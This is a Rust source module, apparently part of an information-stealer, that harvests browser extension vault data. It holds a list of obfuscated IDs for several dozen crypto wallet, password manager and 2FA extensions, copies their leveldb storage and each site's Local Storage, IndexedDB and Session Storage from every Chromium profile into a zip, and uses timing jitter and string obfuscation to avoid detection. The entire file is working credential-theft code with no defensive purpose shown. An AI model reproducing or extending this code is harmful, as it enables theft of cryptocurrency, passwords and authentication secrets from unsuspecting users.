//! Tier 2: browser extension vaults (crypto wallets, password managers, 2FA).
//! Copies each profile's extension leveldb dirs into the zip nested under the
//! browser dir: Browser_<Name>_<Profile>/<ExtensionName>/Local Extension
//! Settings/<extId>/... and writes root BrowserExtensions.json.
//! Also sweeps per-site storage (Local Storage leveldb, IndexedDB, Session
//! Storage) as plain file copies under the same browser/profile dir.

use std::panic::{catch_unwind, AssertUnwindSafe};

use crate::chromium::{browser_roots, profiles};
use crate::fsutil;
use crate::info::Info;
use crate::zipw::ZipBuilder;

const MAX_FILE: u64 = 4 * 1024 * 1024;

/// Well-known extension IDs → display names (wallets, password managers, 2FA).
/// Every ID below was verified against the Chrome Web Store URL or a public
/// threat-research target list (see repo notes); unverifiable products are
/// deliberately absent — they surface under their raw ID. IDs are obfuscated
/// at rest and decoded per lookup; display names are zip output content.
fn known_extensions() -> Vec<(String, &'static str)> {
    vec![
        // --- Crypto wallets -------------------------------------------------
        (crate::obf!("nkbihfbeogaeaoehlefnkodbefgpgknn"), "MetaMask"),
        (crate::obf!("bfnaelmomeimhlpmgjnjophhpkkoljpa"), "Phantom"),
        (crate::obf!("hnfanknocfeofbddgcijnmhnfnkdnaad"), "Coinbase Wallet"),
        (crate::obf!("egjidjbpglichdconbcgcnmaebhcmoap"), "Trust Wallet"),
        (crate::obf!("egjidjbpglichdcondbcbdnbeeppgdph"), "Trust Wallet"),
        (crate::obf!("acmacodkjbdgmoleebolmdjonilkdbch"), "Rabby"),
        (crate::obf!("mcohilncbfahbmgdjkbpemcciiolgcge"), "OKX Wallet"),
        (crate::obf!("pdliaogehgdbhbnmkklieghmmjkpigpa"), "Bybit"),
        (crate::obf!("fhbohimaelbohpjbbldcngcnapndodjp"), "Binance Wallet"),
        (crate::obf!("cadiboklkpojfamcoggejbbdjcoiljjk"), "Binance Wallet"),
        (crate::obf!("hifafgmccdpekplomjjkcfgodnhcellj"), "Crypto.com Onchain"),
        (crate::obf!("jiidiaalihmmhddjgbnbgdfflelocpak"), "Bitget Wallet"), // formerly BitKeep
        (crate::obf!("aholpfdialjgjfhomihkjbmgjidlcdno"), "Exodus"),
        (crate::obf!("hpglfhgfnhbgpjdenjgmdgoeiappafln"), "Guarda"),
        (crate::obf!("hmeobnfnfcmdkdcmlblgagmfpfboieaf"), "Ctrl Wallet"),
        (crate::obf!("kkpllkodjeloidieedojogacfhpaihoh"), "Enkrypt"),
        (crate::obf!("lgmpcpglpngdoalbgeoldeajfclnhafa"), "SafePal"),
        (crate::obf!("bhhhlbepdkbapadjdnnojkbgioiodbic"), "Solflare"),
        (crate::obf!("aflkmfhebedbjioipglgcbcmnbpgliof"), "Backpack"),
        (crate::obf!("klghhnkeealcohjjanjjdaeeggmfmlpl"), "Zerion"),
        (crate::obf!("dmkamcknogkgcdfhhbddcghachkejeap"), "Keplr"),
        (crate::obf!("fcfcfllfndlomdhbehjjcoimbgofdncg"), "Leap"),
        (crate::obf!("fpkhgmpbidmiogeglndfbkegfdlnajnf"), "Cosmostation"),
        (crate::obf!("aiifbnbfobpmeekipheeijimdpnlpgpp"), "Station"),
        (crate::obf!("ejjladinnckdgjemekebdpeokbikhfci"), "Petra"),
        (crate::obf!("efbglgofoippbgcjepnhiblaibcnclgk"), "Martian"),
        (crate::obf!("opcgpfmipidbgpenhmajoajpbobppdil"), "Slush"), // formerly Sui Wallet
        (crate::obf!("khpkpbbcccdmmclmpigdgddabeilkdpd"), "Suiet"),
        (crate::obf!("ibnejdfjmmkpcnlpebklmnkoeoihofec"), "TronLink"),
        (crate::obf!("ldinpeekobnhjjdofggfgjlcehhmanlj"), "Leather"),
        (crate::obf!("opfgelmcmbiajamepnmloijbpoleiama"), "Rainbow"),
        (crate::obf!("aeachknmefphepccionboohckonoeemg"), "Coin98"),
        (crate::obf!("nnpmfplkfogfpmcngplhnbdnnilmcdcg"), "Uniswap"),
        (crate::obf!("mfgccjchihfkkindfppnaooecgfneiii"), "TokenPocket"),
        (crate::obf!("afbcbjpbpfadlkmhmclhkeeodmamcflc"), "MathWallet"),
        (crate::obf!("agoakfejjabomempkjlepdflaleeobhb"), "Core"),
        (crate::obf!("dlcobpjiigpikoobohmabehhmhfoodbb"), "Ready Wallet"), // formerly Argent X
        (crate::obf!("jnlgamecbpmbajjfhmmmlhejkemejdma"), "Braavos"),
        (crate::obf!("fldfpgipfncgndfolcbkdeeknbbbnhcc"), "MyTonWallet"),
        (crate::obf!("fnjhmkhhmkbjkkabndcnnogagogbneec"), "Ronin"),
        (crate::obf!("kppfdiipphfccemcignhifpjkapfbihd"), "Frontier"),
        // --- Password managers ----------------------------------------------
        (crate::obf!("eiaeiblijfjekdanodkjadfinkhbfgcd"), "NordPass"),
        (crate::obf!("aeblfdkhhhdcdjpifhhbdiojplfjncoa"), "1Password"),
        (crate::obf!("nngceckbapebfimnlniiiahkandclblb"), "Bitwarden"),
        (crate::obf!("fdjamakpfbbddfjaooikfcpapjohcfmg"), "Dashlane"),
        (crate::obf!("hdokiejnpimakedhajhdlcegeplioahd"), "LastPass"),
        (crate::obf!("bfogiafebfohielmmehodmfbbebbbpei"), "Keeper"),
        (crate::obf!("pnlccmojcmeohlpggmfnbbiapkmbliob"), "RoboForm"),
        (crate::obf!("ghmbeldphafepmbegfdlkpapadhbakde"), "Proton Pass"),
        (crate::obf!("igkpcodhieompeloncfnbekccinhapdb"), "Zoho Vault"),
        (crate::obf!("admmjipmmciaobhojoghlmleefbicajg"), "Norton Password Manager"),
        (crate::obf!("kmcfomidfpdkfieipokbalgegidffkal"), "Enpass"),
        (crate::obf!("caljgklbbfbcjjanaijlacgncafpegll"), "Avira"),
        (crate::obf!("nhhldecdfagpbfggphklkaeiocfnaafm"), "SAASPASS"),
        // --- 2FA --------------------------------------------------------------
        (crate::obf!("bhghoamapcdpbohphigoooaddinpkbai"), "Authenticator"),
        (crate::obf!("dbfoemgnkgieejfkaddieamagdfepnff"), "2FAS"),
        (crate::obf!("gmegpkknicehidppoebnmbhndjigpica"), "Web2FA"),
        (crate::obf!("gaedmjdfmmahhbjefcbgaolhhanlaolb"), "Authy Desktop"),
    ]
}

fn extension_name(id: &str) -> String {
    for (ext_id, name) in known_extensions() {
        if ext_id == id {
            return name.to_string();
        }
    }
    id.to_string()
}

pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
    let mut manifest: Vec<serde_json::Value> = Vec::new();
    for (browser, user_data) in browser_roots() {
        crate::jitter::sleep_jitter(20, 80);
        for (profile, pdir) in profiles(&user_data) {
            crate::jitter::sleep_jitter(20, 80);
            for kind in [
                crate::obf!("Local Extension Settings"),
                crate::obf!("Sync Extension Settings"),
            ] {
                let _ = catch_unwind(AssertUnwindSafe(|| {
                    collect_settings_dir(
                        zip,
                        info,
                        &mut manifest,
                        &browser,
                        &profile,
                        &pdir.join(&kind),
                        &kind,
                    );
                }));
            }
            // Per-site storage: plain copies, no parsing, no manifest entry.
            let _ = catch_unwind(AssertUnwindSafe(|| {
                let zip_base = format!("Browser_{}_{}", browser, profile);
                for (sub, zip_sub) in [
                    (crate::obf!("Local Storage\\leveldb"), "Local Storage"),
                    (crate::obf!("IndexedDB"), "IndexedDB"),
                    (crate::obf!("Session Storage"), "Session Storage"),
                ] {
                    copy_tree(zip, &pdir.join(sub), &format!("{}/{}", zip_base, zip_sub));
                }
            }));
        }
    }
    if !manifest.is_empty() {
        if let Ok(body) = serde_json::to_vec_pretty(&manifest) {
            // Match the other JSON artifacts: UTF-8 BOM first.
            let mut bytes = Vec::with_capacity(body.len() + 3);
            bytes.extend_from_slice(b"\xef\xbb\xbf");
            bytes.extend_from_slice(&body);
            zip.add_file("BrowserExtensions.json", &bytes);
        }
    }
}

/// Copy every file under `src_root` into the zip at `zip_base/<relpath>`.
/// Silent skips for missing dirs, unreadable files, oversized files.
fn copy_tree(zip: &mut ZipBuilder, src_root: &std::path::Path, zip_base: &str) {
    let mut files = Vec::new();
    fsutil::walk_files(src_root, MAX_FILE, &mut files);
    for (file, _) in &files {
        let Some(data) = fsutil::read_file(file) else {
            continue;
        };
        let rel = match file.strip_prefix(src_root) {
            Ok(r) => r.to_string_lossy().replace('\\', "/"),
            Err(_) => continue,
        };
        zip.add_file(&format!("{}/{}", zip_base, rel), &data);
    }
}

fn collect_settings_dir(
    zip: &mut ZipBuilder,
    info: &mut Info,
    manifest: &mut Vec<serde_json::Value>,
    browser: &str,
    profile: &str,
    dir: &std::path::Path,
    kind: &str,
) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let ext_dir = entry.path();
        if !ext_dir.is_dir() {
            continue;
        }
        let id = entry.file_name().to_string_lossy().into_owned();
        let mut files = Vec::new();
        fsutil::walk_files(&ext_dir, MAX_FILE, &mut files);
        if files.is_empty() {
            continue;
        }
        let name = extension_name(&id);
        let base = format!(
            "Browser_{}_{}/{}/{}/{}",
            browser, profile, name, kind, id
        );
        let mut wrote = false;
        for (file, _) in &files {
            let Some(data) = fsutil::read_file(file) else {
                continue;
            };
            let rel = match file.strip_prefix(&ext_dir) {
                Ok(r) => r.to_string_lossy().replace('\\', "/"),
                Err(_) => continue,
            };
            zip.add_file(&format!("{}/{}", base, rel), &data);
            wrote = true;
        }
        if wrote {
            info.add_extension(&name);
            manifest.push(serde_json::json!({
                "browser": browser,
                "profile": profile,
                "extension": name,
                "id": id,
            }));
        }
    }
}
